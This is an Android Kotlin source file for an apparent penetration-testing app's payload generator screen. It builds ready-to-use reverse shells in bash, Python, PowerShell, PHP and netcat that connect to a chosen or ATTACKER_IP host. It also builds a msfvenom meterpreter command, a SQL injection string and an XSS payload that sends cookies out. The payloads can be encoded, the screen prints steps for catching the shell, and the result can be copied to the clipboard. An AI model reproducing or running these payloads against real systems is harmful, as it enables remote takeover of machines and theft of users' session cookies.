package com.pentest.dashboard

import android.os.Bundle
import android.widget.ArrayAdapter
import android.widget.ImageView
import android.widget.Spinner
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.button.MaterialButton
import com.google.android.material.textfield.TextInputEditText

class PayloadGeneratorActivity : AppCompatActivity() {

    private lateinit var inputIP: TextInputEditText
    private lateinit var inputPort: TextInputEditText
    private lateinit var spinnerPayloadType: Spinner
    private lateinit var spinnerEncoder: Spinner
    private lateinit var outputText: TextView
    private lateinit var btnGenerate: MaterialButton
    private lateinit var btnCopy: MaterialButton

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_payload_generator)

        initializeViews()
        setupClickListeners()
    }

    private fun initializeViews() {
        inputIP = findViewById(R.id.inputIP)
        inputPort = findViewById(R.id.inputPort)
        spinnerPayloadType = findViewById(R.id.spinnerPayloadType)
        spinnerEncoder = findViewById(R.id.spinnerEncoder)
        outputText = findViewById(R.id.outputText)
        btnGenerate = findViewById(R.id.btnGenerate)
        btnCopy = findViewById(R.id.btnCopy)

        val payloadTypes = arrayOf(
            "Bash Reverse Shell",
            "Python Reverse Shell",
            "PowerShell Reverse Shell",
            "PHP Reverse Shell",
            "Netcat Reverse Shell",
            "Metasploit Payload",
            "SQL Injection",
            "XSS Payload"
        )
        spinnerPayloadType.adapter = ArrayAdapter(this, android.R.layout.simple_spinner_item, payloadTypes)

        val encoders = arrayOf("None", "Base64", "URL Encode", "Hex")
        spinnerEncoder.adapter = ArrayAdapter(this, android.R.layout.simple_spinner_item, encoders)

        btnCopy.isEnabled = false
    }

    private fun setupClickListeners() {
        findViewById<ImageView>(R.id.btnBack).setOnClickListener { finish() }

        btnGenerate.setOnClickListener {
            generatePayload()
        }

        btnCopy.setOnClickListener {
            copyToClipboard()
        }
    }

    private fun generatePayload() {
        val ip = inputIP.text.toString().ifEmpty { "ATTACKER_IP" }
        val port = inputPort.text.toString().ifEmpty { "4444" }
        val payloadType = spinnerPayloadType.selectedItemPosition

        var payload = when (payloadType) {
            0 -> "bash -i >& /dev/tcp/$ip/$port 0>&1"
            1 -> "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
            2 -> "\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}\$client.Close()"
            3 -> "<?php \$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");?>"
            4 -> "nc -e /bin/sh $ip $port"
            5 -> "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf > shell.elf"
            6 -> "' OR '1'='1' -- -"
            7 -> "<script>fetch('http://$ip:$port?c='+document.cookie)</script>"
            else -> "Unknown payload type"
        }

        val encoder = spinnerEncoder.selectedItemPosition
        payload = when (encoder) {
            1 -> android.util.Base64.encodeToString(payload.toByteArray(), android.util.Base64.NO_WRAP)
            2 -> java.net.URLEncoder.encode(payload, "UTF-8")
            3 -> payload.toByteArray().joinToString("") { "%02x".format(it) }
            else -> payload
        }

        outputText.text = """
PAYLOAD GENERATED
=================

Type: ${spinnerPayloadType.selectedItem}
Encoding: ${spinnerEncoder.selectedItem}

PAYLOAD:
--------
$payload

USAGE:
------
1. Start listener: nc -lvnp $port
2. Execute payload on target
3. Receive reverse shell connection
        """.trimIndent()

        btnCopy.isEnabled = true
    }

    private fun copyToClipboard() {
        val payload = outputText.text.toString()
            .substringAfter("PAYLOAD:\n--------\n")
            .substringBefore("\n\nUSAGE:")

        val clipboard = getSystemService(CLIPBOARD_SERVICE) as android.content.ClipboardManager
        val clip = android.content.ClipData.newPlainText("Generated Payload", payload)
        clipboard.setPrimaryClip(clip)

        Toast.makeText(this, "Payload copied!", Toast.LENGTH_SHORT).show()
    }
}
